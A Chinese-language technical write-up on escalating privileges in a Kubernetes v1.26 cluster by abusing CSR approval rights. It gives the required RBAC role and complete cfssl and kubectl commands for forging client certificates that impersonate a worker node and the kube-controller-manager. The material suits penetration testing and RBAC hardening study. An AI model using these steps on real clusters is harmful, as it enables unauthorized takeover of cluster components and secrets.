
测试kubernetes版本：v1.26.0

## 利用certificatesigningrequests approval攻击

### 被攻击的主体角色

在kubernetes官方文档[基于角色的访问控制良好实践](https://kubernetes.io/zh-cn/docs/concepts/security/rbac-good-practices/#csrs-and-certificate-issuing)中提到用户拥有 `create` CSR 的权限和 `update` `certificatesigningrequests/approval` 的权限，可以通过此签名创建的客户端证书允许用户向集群进行身份验证。 这些客户端证书可以包含任意的名称，包括 Kubernetes 系统组件的副本


假设攻击者已经获取了一个主体的身份凭证，按照提权的需求我们需要这些权限

* 能够发起`csr`请求
* 能够对特定或全部类型的`singerName`进行审批

所以我们获取的主体需要具有以下权限

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: approval-test
rules:
- apiGroups:
  - certificates.k8s.io
  resources:
  - certificatesigningrequests/approval
  verbs:
  - update
- apiGroups:
  - certificates.k8s.io
  resources:
  - certificatesigningrequests
  verbs:
  - get
  - create
- apiGroups:
  - certificates.k8s.io
  resources:
  - signers
  verbs:
  - approve
```

其中`signers`资源可能通过`resourceName`进行进一步的限制，只允许审批固定类型的`csr`，这里是实际攻击或者加固中需要关注的点

需要注意的一点是由于集群默认启用了`CertificateSubjectRestriction`准入插件，我们无法将自己直接提升权限为`system:master`

通过查看集群默认的`ClusterRoleBindings`可以看到我们通过申请`csr`的方式可以获得到已经绑定权限了的组或者主体的凭证副本

| CN                             | O                                               | clusterrole                                                                                                     |
| ------------------------------ | ----------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| system:node:nodename           | system:nodes                                    | system:certificates.k8s.io:certificatesigningrequests:selfnodeclient                                            |
| *                              | system:bootstrappers:kubeadm:default-node-token | kubeadm:get-nodes、system:node-bootstrapper、system:certificates.k8s.io:certificatesigningrequests:nodeclient   |
| *                              | system:authenticated                            | system:basic-user、system:discovery、system:public-info-viewer                                                  |
| *                              | system:monitoring                               | system:monitoring                                                                                               |
| *                              | system:serviceaccounts                          | system:service-account-issuer-discovery                                                                         |
| system:kube-controller-manager | nil                                             | system:kube-controller-manager                                                                                  |
| system:kube-scheduler          | nil                                             | system:kube-scheduler、system:volume-scheduler                                                                  |
| system:kube-proxy              | nil                                             | system:node-proxier                                                                                             |


### 尝试申请node节点的证书获取node的控制权

这里假设集群中存在一个名字为`k8sworker1.example.net`的`node`节点

为这个`node`创建一个`csr`

```shell
cat <<EOF | ./cfssl_1.6.3_linux_amd64 genkey - | ./cfssljson_1.6.3_linux_amd64 -bare k8sworker1.example.net
{
	"CN": "system:node:k8sworker1.example.net",
	"key": {
		"algo": "rsa",
		"size": 2048
	},
	"names": [
		{
			"O": "system:nodes"
		}
	]
}
EOF
```

执行成功后会在当前目录下创建`k8sworker1.example.net.csr`和`k8sworker1.example.net-key.pem`两个文件

接下来向apiserver提交csr请求

```yaml
cat <<EOF | kubectl --validate=false apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: k8sworker1.example.net
spec:
  groups:
    - system:nodes
  request: $(cat ./k8sworker1.example.net.csr | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client-kubelet
  usages: ["key encipherment", "digital signature", "client auth"]
EOF
```

如何选择signerName，以及如何构造提交csr request的yaml可以参考：[kubernetes签名者](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/certificate-signing-requests/#kubernetes-signers)

执行完成后可以通过`kubectl get csr k8sworker1.example.net` 看到当前csr请求处于Pending状态

执行`kubectl certificate approve k8sworker1.example.net` 通过当前csr请求，内容如下：

```yaml
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"certificates.k8s.io/v1","kind":"CertificateSigningRequest","metadata":{"annotations":{},"name":"k8sworker1.example.net"},"spec":{"groups":["system:nodes"],"request":"xxxxxxx","signerName":"kubernetes.io/kube-apiserver-client-kubelet","usages":["key encipherment","digital signature","client auth"]}}
  creationTimestamp: "2023-02-23T14:40:58Z"
  name: k8sworker1.example.net
  resourceVersion: "6093073"
  uid: 523e4f9a-2bb2-497c-8f41-3a3adb5d9b00
spec:
  groups:
  - system:serviceaccounts
  - system:serviceaccounts:default
  - system:authenticated
  request: xxxxxxx
  signerName: kubernetes.io/kube-apiserver-client-kubelet
  uid: e0b244eb-d722-45d1-86d0-3c76fde6020f
  usages:
  - key encipherment
  - digital signature
  - client auth
  username: system:serviceaccount:default:be-test
status:
  certificate: xxxxx
  conditions:
  - lastTransitionTime: "2023-02-23T14:43:17Z"
    lastUpdateTime: "2023-02-23T14:43:17Z"
    message: This CSR was approved by kubectl certificate approve.
    reason: KubectlApprove
    status: "True"
    type: Approved
```

转储申请到的证书`kubectl get csr k8sworker1.example.net -o jsonpath='{.status.certificate}' | base64 -d > k8sworker1.example.net.crt`

通过生成的`k8sworker1.example.net.crt`和`k8sworker1.example.net-key.pem`完成权限提升，获取`k8sworker1.example.net`节点角色权限


### 尝试申请Kubernetes系统组件的凭证副本

以`system:kube-controller-manager`为例

kube-controller-manager组件绑定的角色权限相比于node更多，权限列表如下：

```text
Resources                                       Non-Resource URLs                     Resource Names                          Verbs
secrets                                         []                                    []                                      [create delete get update]
serviceaccounts                                 []                                    []                                      [create get update]
events                                          []                                    []                                      [create patch update]
events.events.k8s.io                            []                                    []                                      [create patch update]
endpoints                                       []                                    []                                      [create]
serviceaccounts/token                           []                                    []                                      [create]
tokenreviews.authentication.k8s.io              []                                    []                                      [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                                      [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                                      [create]
subjectaccessreviews.authorization.k8s.io       []                                    []                                      [create]
leases.coordination.k8s.io                      []                                    []                                      [create]
endpoints                                       []                                    [kube-controller-manager]               [get update]
leases.coordination.k8s.io                      []                                    [kube-controller-manager]               [get update]
                                                [/api/*]                              []                                      [get]
                                                [/api]                                []                                      [get]
                                                [/apis/*]                             []                                      [get]
                                                [/apis]                               []                                      [get]
                                                [/healthz]                            []                                      [get]
                                                [/healthz]                            []                                      [get]
                                                [/livez]                              []                                      [get]
                                                [/livez]                              []                                      [get]
                                                [/openapi/*]                          []                                      [get]
                                                [/openapi]                            []                                      [get]
                                                [/readyz]                             []                                      [get]
                                                [/readyz]                             []                                      [get]
                                                [/version/]                           []                                      [get]
                                                [/version/]                           []                                      [get]
                                                [/version]                            []                                      [get]
                                                [/version]                            []                                      [get]
configmaps                                      []                                    []                                      [get]
namespaces                                      []                                    []                                      [get]
*.*                                             []                                    []                                      [list watch]
```

操作步骤于申请node节点的证书基本相同

创建csr

```shell
cat <<EOF | ./cfssl_1.6.3_linux_amd64 genkey - | ./cfssljson_1.6.3_linux_amd64 -bare kube-controller-manager
{
	"CN": "system:kube-controller-manager",
	"key": {
		"algo": "rsa",
		"size": 2048
	}
}
EOF
```

这里有一点是为什么不需要填写Organization Name字段，在kubernetes官方文档中有详细说明每个系统组件对应的CN和O，详细见：[PKI 证书和要求](https://kubernetes.io/zh-cn/docs/setup/best-practices/certificates/)

提交csr请求

```yaml
cat <<EOF | kubectl --kubeconfig .kube/sa-be-config --validate=false apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: kube-controller-manager
spec:
  request: $(cat ./kube-controller-manager.csr | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client
  usages: ["client auth"]
EOF
```

这里的构造方式为什么没有了group字段，usages为什么填写client auth和上文描述的相同参考：[kubernetes签名者](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/certificate-signing-requests/#kubernetes-signers) 填写即可

然后以同样的方式审批，获取证书即可